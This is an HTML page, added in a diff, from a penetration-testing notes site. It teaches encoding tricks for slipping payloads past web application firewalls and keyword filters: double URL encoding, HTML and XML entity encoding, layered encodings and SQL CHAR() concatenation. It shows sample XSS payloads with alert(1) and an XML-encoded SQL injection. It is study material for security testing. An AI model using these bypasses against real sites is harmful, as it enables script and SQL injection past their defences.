@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | General obfuscation</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>General obfuscation</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#url-encoding" id="toc-url-encoding">URL encoding</a>
+<ul>
+<li><a href="#double-url-encoding" id="toc-double-url-encoding">Double URL encoding</a></li>
+<li><a href="#html-encoding" id="toc-html-encoding">HTML encoding</a></li>
+</ul></li>
+<li><a href="#xml-encoding" id="toc-xml-encoding">XML encoding</a></li>
+<li><a href="#multiple-encodings" id="toc-multiple-encodings">Multiple encodings</a></li>
+<li><a href="#sql-char-function" id="toc-sql-char-function">SQL CHAR() function</a></li>
+</ul></div>
+  <hr>
+<blockquote>
+<p><strong>Note</strong>: For Javascript obfuscation go on <a href="/Web/Web%20security/javascript%20and%20obfuscation.html">Javascript &amp; Obfuscation</a>.</p>
+</blockquote>
+<h2 id="url-encoding">URL encoding</h2>
+<p>Sometimes, WAFs may fail to properly URL decode your input during checks.</p>
+<p>-&gt; Encode the keywords, so <code>SELECT</code> becomes <code>%53%45%4C%45%43%54</code>.</p>
+<h3 id="double-url-encoding">Double URL encoding</h3>
+<p>Since the WAF decodes the input only once, it may fail to detect the threat. If the back-end server double-decodes it, the payload will be injected successfully.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert</span><span class="er">(</span><span class="ex">1</span><span class="kw">)</span><span class="ex">%253E</span></span></code></pre></div>
+<h3 id="html-encoding">HTML encoding</h3>
+<p>In certain HTML locations, like element text or attribute values, browsers automatically decode these references when parsing.</p>
+<p>Server-side checks for alert() may miss it if you HTML encode characters.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">x</span> <span class="er">onerror</span><span class="ot">=</span><span class="st">&quot;</span><span class="dv">&amp;#x61;</span><span class="st">lert(1)&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>When the browser renders the page, it will decode and execute the injected payload.</p>
+<p><strong>Leading zeros</strong></p>
+<p>HTML encode <code>:</code> -&gt; <code>&amp;#58;</code> = <code>&amp;#0000000000058;</code></p>
+<p><code>&lt;a href="javascript&amp;#00000000000058;alert(1)"&gt;Click me&lt;/a&gt;</code></p>
+<hr />
+<h2 id="xml-encoding">XML encoding</h2>
+<p>XML supports character encoding with the same numeric escape sequences as HTML.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">stockCheck</span>&gt;</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">productId</span>&gt;</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        123</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">productId</span>&gt;</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">storeId</span>&gt;</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        999 <span class="dv">&amp;#x53;</span>ELECT * FROM information_schema.tables</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">storeId</span>&gt;</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">stockCheck</span>&gt;</span></code></pre></div>
+<hr />
+<h2 id="multiple-encodings">Multiple encodings</h2>
+<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;javascript:</span><span class="dv">&amp;bsol;</span><span class="st">u0061lert(1)&quot;</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>(HTML) <code>&amp;bsol;</code> -&gt; <code>\</code></p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;javascript:\u0061lert(1)&quot;</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>(Unicode) <code>\u0061</code> -&gt; <code>a</code></p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;javascript:alert(1)&quot;</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="sql-char-function">SQL CHAR() function</h2>
+<p><code>CHAR(83)</code> = <code>CHAR(0x53)</code> = <code>S</code></p>
+<p><code>SELECT</code> is blacklisted -&gt;</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">CHAR</span>(<span class="dv">83</span>)<span class="op">+</span><span class="dt">CHAR</span>(<span class="dv">69</span>)<span class="op">+</span><span class="dt">CHAR</span>(<span class="dv">76</span>)<span class="op">+</span><span class="dt">CHAR</span>(<span class="dv">69</span>)<span class="op">+</span><span class="dt">CHAR</span>(<span class="dv">67</span>)<span class="op">+</span><span class="dt">CHAR</span>(<span class="dv">84</span>)</span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
